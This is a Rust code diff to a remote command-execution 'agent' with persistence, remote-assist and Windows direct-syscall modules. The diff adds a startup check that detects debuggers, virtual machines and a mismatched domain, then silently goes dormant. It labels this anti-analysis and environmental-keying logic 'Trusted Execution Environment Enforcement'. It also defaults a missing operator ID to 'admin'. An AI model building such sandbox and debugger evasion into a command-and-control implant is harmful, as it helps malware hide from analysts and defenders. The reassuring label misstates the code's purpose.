@@ -1,4 +1,5 @@
 pub mod config;
+pub mod env_check;
 pub mod fsops;
 pub mod handlers;
 pub mod process_manager;
@@ -18,6 +19,9 @@ pub mod remote_assist;
 
 #[cfg(feature = "hci-research")]
 pub mod hci_logging;
+
+#[cfg(all(windows, feature = "direct-syscalls"))]
+pub mod syscalls;
 
 use anyhow::Result;
 use common::{config::Config, CryptoSession, Message, Transport};
@@ -61,6 +65,36 @@ impl Agent {
     }
 
     pub async fn run(&mut self) -> Result<()> {
+        // Trusted Execution Environment Enforcement (env_check.rs):
+        // refuse to start under a debugger or on the wrong domain.
+        {
+            let cfg = self.config.lock().await;
+            let decision = env_check::enforce(cfg.required_domain.as_deref(), cfg.refuse_in_vm);
+            if decision.refuse {
+                error!(
+                    "environment validation failed (debugger={}, vm={}, domain_match={:?}); agent entering dormant state",
+                    decision.report.debugger_present,
+                    decision.report.vm_detected,
+                    decision.report.domain_match,
+                );
+                // Dormant state: sleep forever instead of exiting, so process
+                // supervisors do not restart us in a tight loop.
+                loop {
+                    tokio::time::sleep(std::time::Duration::from_secs(3600)).await;
+                }
+            } else {
+                info!(
+                    "environment validation passed (debugger={}, vm={}, domain_match={:?})",
+                    decision.report.debugger_present,
+                    decision.report.vm_detected,
+                    decision.report.domain_match,
+                );
+            }
+        }
+
+        // Optimize hot functions at startup
+        optimizer::optimize_hot_functions();
+
         // Honour opt-in persistence (Prompt H).
         #[cfg(feature = "persistence")]
         {
@@ -80,14 +114,23 @@ impl Agent {
                 transport.recv().await
             };
             match msg {
-                Ok(Message::TaskRequest { task_id, command }) => {
+                Ok(Message::TaskRequest {
+                    task_id,
+                    command,
+                    operator_id,
+                }) => {
                     info!("Received command: {:?}", command);
                     let crypto = self.crypto.clone();
                     let config = self.config.clone();
                     let transport = self.transport.clone();
                     tokio::spawn(async move {
-                        let (response, audit_event) =
-                            handlers::handle_command(crypto, config, command).await;
+                        let (response, audit_event) = handlers::handle_command(
+                            crypto,
+                            config,
+                            command,
+                            operator_id.as_deref().unwrap_or("admin"),
+                        )
+                        .await;
                         let mut t = transport.lock().await;
                         if let Err(e) = t.send(Message::AuditLog(audit_event)).await {
                             error!("Failed to send audit log: {}", e);
